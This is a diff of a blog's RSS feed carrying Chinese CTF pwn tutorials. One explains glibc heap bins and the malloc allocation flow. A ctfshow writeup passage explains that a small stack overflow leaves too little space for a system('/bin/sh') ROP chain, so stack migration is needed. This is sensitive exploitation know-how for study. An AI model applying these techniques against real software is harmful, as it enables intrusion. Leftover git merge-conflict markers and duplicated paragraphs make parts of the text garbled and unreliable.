+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;INTERNAL_SIZE_T_system_mem&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;n&#34;&gt;INTERNAL_SIZE_T_max_system_mem&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;各种内存块介绍&#34;&gt;各种内存块介绍
+&lt;/h3&gt;&lt;p&gt;各种bins：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/6.png&#34;
+	width=&#34;1170&#34;
+	height=&#34;530&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/6_hu_356d3d1f41d3a343.png 480w, https://expl0rer.top/p/pwn-3/6_hu_681cc24595ccc945.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;220&#34;
+		data-flex-basis=&#34;529px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;fastbin&#34;&gt;Fastbin
+&lt;/h4&gt;&lt;p&gt;管理fastbin free chunk，单链表结构，FILO（最后一个进入fastbin链表的，会被放在头部）总共有十个fastbin链表，每个链表中fastbin的size一样，&lt;code&gt;0x10&lt;/code&gt;递增。&lt;/p&gt;
+&lt;p&gt;大小属于fastbin的chunk被free掉时，不会改变next chunk的prev inuse位，也就是说不会被合并。&lt;/p&gt;
+&lt;img src=&#34;7.png&#34; alt=&#34;Fastbin&#34; style=&#34;zoom:175%;&#34; /&gt;
+&lt;h4 id=&#34;unsortedbin&#34;&gt;Unsortedbin
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;管理unsorted chunk，只有一个双向链
+表&lt;/strong&gt;。所有大小大于fastbin的chunk都会先被暂
+时放入unsortedbin中，链表中的chunk大小不一样。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/pwn-3/8.png&#34;
+	width=&#34;505&#34;
+	height=&#34;680&#34;
+	srcset=&#34;https://expl0rer.top/p/pwn-3/8_hu_ede4dba4e4677942.png 480w, https://expl0rer.top/p/pwn-3/8_hu_77246d469abdf9c8.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;74&#34;
+		data-flex-basis=&#34;178px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;*&lt;strong&gt;注意：这里的指向箭头比较多&lt;/strong&gt;&lt;/p&gt;
+&lt;h4 id=&#34;smallbin&#34;&gt;Smallbin
+&lt;/h4&gt;&lt;p&gt;管理small chunk，由62个双向链表组成，
+每个链表中的chunk大小一样，大小以0x10递
+增。长得和unsortedbin差不多的。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+      +-------------------+      +-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     smallbin      | &amp;lt;--&amp;gt; |   free chunk 1    | &amp;lt;--&amp;gt; |   free chunk 2    | &amp;lt;--&amp;gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|  (size = 0x20)    |      |                   |      |                   |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+      +-------------------+      +-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         v
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+      +-------------------+      +-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     smallbin      | &amp;lt;--&amp;gt; |   free chunk 1    | &amp;lt;--&amp;gt; |   free chunk 2    | &amp;lt;--&amp;gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|  (size = 0x30)    |      |                   |      |                   |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+      +-------------------+      +-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         v
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       ... (更多 smallbin，大小递增)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;         v
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+      +-------------------+      +-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     smallbin      | &amp;lt;--&amp;gt; |   free chunk 1    | &amp;lt;--&amp;gt; |   free chunk 2    | &amp;lt;--&amp;gt; ...
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|  (size = 0x3F0)   |      |                   |      |                   |
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+-------------------+      +-------------------+      +-------------------+
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;largebin&#34;&gt;Largebin
+&lt;/h4&gt;&lt;p&gt;管理large chunk，63个双向链表，FIFO。同一个双线链表中chunk大小可以不一样，但是在一定范围内，bins大小从小到大排列。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在此我们先不学习larbin attack的相关内容，所以看看就行，了解一下。比较少遇见Largebin的相关题。&lt;/p&gt;&lt;/blockquote&gt;
+&lt;img src=&#34;9.png&#34; style=&#34;zoom:150%;&#34; /&gt;
+&lt;h3 id=&#34;malloc运行流程&#34;&gt;Malloc运行流程
+&lt;/h3&gt;&lt;p&gt;了解完各种bin之后，现在来看看这：&lt;/p&gt;
+&lt;p&gt;当我们调用malloc时，程序都干了些什么？&lt;/p&gt;
+&lt;p&gt;1、计算真正的堆块的大小（加上堆头部长度、对齐）：&lt;/p&gt;
+&lt;p&gt;判断是否在fastbin范围内：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;确定在，检查对应大小的bin链表中有无chunk。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;有，那就分配给用户，至此完成。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;如果不在fastbin范围内，或者没用chunk可用。（两者满足一个或者都满足的话）&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;继续判断是否在smallbin范围内：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;在smallbin范围内，检查对应大小的bin链表中有无chunk。
+&lt;ul&gt;
+&lt;li&gt;有chunk，那就取出来给程序，至此完成。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;不在smallbin范围内，或者smallbin里面也没有chunk。这时候跳到unsortedbin的检查。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;unsortedbin中有无chunk？&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;有，从尾部取出第一个chunk，看看大小是否满足需求。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;满足，切分后大小是否大于&lt;strong&gt;minsize&lt;/strong&gt;？
+&lt;ul&gt;
+&lt;li&gt;大于，再切分块，返回给用户，剩下的块放进unsortedbin。&lt;/li&gt;
+&lt;li&gt;小于或等于minsize，直接返回给用户，完成。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;不满足大小需求，把这个块放入smallbin / largebin对应的链表中，继续遍历下一个块。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;没。unsortedbin的所有块都不满足，那此时就判断是否在largebin范围。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;是，检查对应的bin链表中有无符合的chunk。
+&lt;ul&gt;
+&lt;li&gt;有符合的，找到满足需求最小的chunk，切分块返回，剩下的放进unsortedbin中。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;不在，那就再次遍历smallbin / largebin找best fit的chunk。&lt;/li&gt;
+&lt;li&gt;我去？还是没用，那就从&lt;code&gt;topchunk&lt;/code&gt;中切割。&lt;/li&gt;
+&lt;li&gt;？？搞什么鬼？？topchunk也不够？那就&lt;code&gt;mmap&lt;/code&gt;系统调用&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
 </description>
         </item>
         <item>
@@ -8434,7 +9105,18 @@ ROP、shellcode、栈转移等。&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;其实在连靶机进行交互时，无论你输入什么，都是招原样给你打印出来的，主要还是看read、memset函数，况且没开canary保护有站处理漏洞可以利用。&lt;/p&gt;
-&lt;p&gt;跟进hackerout函数：&lt;/p&gt;
+&lt;p&gt;&amp;laquo;&amp;laquo;&amp;laquo;&amp;lt; HEAD
+在海曙目录还看到了system函数。&lt;/p&gt;
+&lt;p&gt;=======&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;191b05fa45e02dc8995178e6a8d2c0c238003afb
+跟进hackerout函数：&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
 &lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/280.png&#34;
 	width=&#34;934&#34;
 	height=&#34;443&#34;
@@ -8448,7 +9130,18 @@ ROP、shellcode、栈转移等。&lt;/p&gt;
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;看到有system函数，不过里边不是binsh，问题不大可以构造出来。&lt;/p&gt;
-&lt;p&gt;看回ctfshow函数的栈溢出漏洞，可以发现s容量是36，但s到ebp距离有0x28=40，加上覆盖ebp本身的4字节，也就是说只有8字给到我们放东西，无法进行我们的ROP链构造，那么这里就应该要想到&lt;code&gt;栈迁移&lt;/code&gt;了&lt;/p&gt;
+&lt;p&gt;&amp;laquo;&amp;laquo;&amp;laquo;&amp;lt; HEAD
+看回ctfshow函数的栈溢出漏洞，可以发现s容量是36，但s到ebp距离有0x28=40，加上覆盖ebp本身的4字节，仅 8 字节（44-36=8）溢出空间，无法直接布置&lt;code&gt;system(&amp;quot;/bin/sh&amp;quot;);&lt;/code&gt; 所需的 ROP 链（需覆盖返回地址 + 传递参数，至少 12 字节以上），那么这里就应该要想到&lt;code&gt;栈迁移&lt;/code&gt;了。&lt;/p&gt;
+&lt;h1 id=&#34;栈迁移的本质是通过-将原本狭小的栈空间转移到我们可控的大空间那我们就得调用levae汇编指令&#34;&gt;栈迁移的本质是&lt;strong&gt;通过 &lt;code&gt;leave&lt;/code&gt; 指令改变栈顶指针（esp）的位置&lt;/strong&gt;，将原本狭小的栈空间转移到我们可控的大空间。那我们就得调用levae汇编指令
+&lt;/h1&gt;&lt;p&gt;看回ctfshow函数的栈溢出漏洞，可以发现s容量是36，但s到ebp距离有0x28=40，加上覆盖ebp本身的4字节，也就是说只有8字给到我们放东西，无法进行我们的ROP链构造，那么这里就应该要想到&lt;code&gt;栈迁移&lt;/code&gt;了&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;191b05fa45e02dc8995178e6a8d2c0c238003afb&lt;/p&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;&lt;/blockquote&gt;
 </description>
         </item>
         <item>
